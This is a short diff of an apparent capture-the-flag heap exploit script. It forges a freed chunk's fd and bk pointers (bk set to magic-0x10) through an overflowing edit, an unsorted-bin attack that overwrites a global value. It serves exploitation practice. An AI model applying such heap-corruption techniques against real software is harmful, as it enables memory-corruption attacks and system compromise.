@@ -34,7 +34,10 @@ create(0x80, "aaaa")
 create(0x80, "bbbb")
 create(0x80, "cccc")
 delete(1)
-payload = "a" * 0x80 + flat([0, 0x91, 0, magic-0x10])
+
+fd = 0
+bk = magic-0x10
+payload = "a" * 0x80 + flat([0, 0x91, fd, bk])
 edit(0, 0x200, payload)
 create(0x80, "dddd")
 
